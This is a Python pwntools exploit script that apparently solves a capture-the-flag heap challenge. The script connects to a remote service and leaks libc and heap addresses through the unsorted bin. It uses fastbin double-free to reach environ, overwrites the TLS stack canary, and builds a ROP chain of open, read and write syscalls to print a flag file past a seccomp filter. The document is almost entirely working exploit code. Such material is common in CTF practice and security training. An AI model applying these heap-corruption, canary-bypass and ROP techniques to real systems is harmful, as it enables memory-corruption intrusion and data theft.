#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.31'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "60"]
host, port = '103.185.53.181', 4567

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x1836
breakrva 0x1843
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x09 0xffffffff  if (A != 0xffffffff) goto 0014
#  0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
#  0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
#  0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
#  0008: 0x15 0x04 0x00 0x0000000c  if (A == brk) goto 0013
#  0009: 0x15 0x03 0x00 0x0000003c  if (A == exit) goto 0013
#  0010: 0x15 0x02 0x00 0x0000004e  if (A == getdents) goto 0013
#  0011: 0x15 0x01 0x00 0x0000009d  if (A == prctl) goto 0013
#  0012: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0014
#  0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0014: 0x06 0x00 0x00 0x00000000  return KILL

def add(idx, size, data):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendlineafter(b':', data)

def view(idx):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', str(idx).encode())

    io.recvline()
    return io.recvline()

def delete(idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def exploit():
    global io
    io = initialize()

    # clean bins from seccomp
    for i in range(7+5+3+6):
        add(1, 0x10, b'cleaning')
    for i in range(7+5+3+6):
        add(1, 0x60, b'cleaning')
    for i in range(7+5+1):
        add(1, 0x70, b'cleaning')

    # unsorted bin leak libc
    for i in range(10):
        add(i+1, 0x90, 8 * f'{i+1}'.encode())
    add(15, 0x10, b'wilderness')
    for i in range(8):
        delete(i+1)
    libc.address = u64(view(8).strip().ljust(8, b'\x00')) - 0x1ecbe0
    heap = u64(view(7).strip().ljust(8, b'\x00')) - 0x33c0
    for i in range(7):
        add(i+1, 0x90, 8 * b'cleaning')

    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    pop_rdx_r12 = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
    xchg_edi_eax = libc.address + 0xf1b65 # xchg edi, eax ; ret

    # fastbin dup to environ
    for i in range(10):
        add(i+1, 0x10, f'{i+1}'.encode())
    for i in range(7):
        delete(i+1)
    delete(8)
    delete(9)
    delete(8)

    for i in range(7):
        add(i+1, 0x10, b'cleaning')
    add(8, 0x10, p64(libc.sym['environ']))
    add(9, 0x10, b'bruv')
    add(9, 0x10, b'bruv')
    add(10, 0x10, b'\x00')

    delete(9)
    stack = u64(view(9).strip().ljust(8, b'\x00'))
    rip = stack - 0x100

    # fastbin dup to tls/tcb overwrite canary
    for i in range(10):
        add(i+1, 0x20, f'{i+1}'.encode())
    for i in range(7):
        delete(i+1)
    delete(8)
    delete(9)
    delete(8)

    for i in range(7):
        add(i+1, 0x20, b'cleaning')
    add(8, 0x20, p64(libc.address - 0x2898)) # tls canary
    add(9, 0x20, b'bruv')
    add(9, 0x20, b'bruv')
    add(10, 0x20, p64(0x0) * 2)

    # fastbin dup to stack rop
    for i in range(10):
        add(i+1, 0x70, f'{i+1}'.encode())
    for i in range(7):
        delete(i+1)
    delete(8)
    delete(9)
    delete(8)

    for i in range(7):
        add(i+1, 0x70, b'cleaning')
    add(8, 0x70, p64(rip-(8*4)))
    add(9, 0x70, b'./flag-56cf787305f8b9ba261b48084ae69b35.txt\x00') # 0x3d80
    add(9, 0x70, b'bruv') # 0x3d00

    # read more payload
    payload = flat([
        # canary
        p64(0x0)*4,
        
        # read
        pop_rdi,
        0x0,
        pop_rsi,
        rip+(0x38+0x18),
        pop_rdx_r12,
        0x200,
        0x0,
        pop_rax,
        0x0,
        syscall,
    ])
    add(10, 0x70, payload)

    payload2 = flat([
        # open
        pop_rdi,
        heap + 0x3d80,
        pop_rsi,
        0x0,
        pop_rdx_r12,
        0x0,
        0x0,
        pop_rax,
        0x2,
        syscall,
        xchg_edi_eax,

        # getdents
        # pop_rsi,
        # heap + 0x3d00,
        # pop_rdx_r12,
        # 0x500,
        # 0x0,
        # pop_rax,
        # 0x4e,
        # syscall,
        
        # read
        pop_rsi,
        heap + 0x3d00,
        pop_rdx_r12,
        0x500,
        0x0,
        pop_rax,
        0x0,
        syscall,

        # write
        pop_rdi,
        0x1,
        pop_rax,
        0x1,        
        syscall
    ])

    # exit
    io.sendline(b'\n4')

    io.sendline(payload2)

    log.info('payload length: %#x', len(payload))
    log.success('libc base: %#x', libc.address)
    log.success('heap base: %#x', heap)
    log.success('stack leak: %#x', stack)
    log.success('rip: %#x', rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()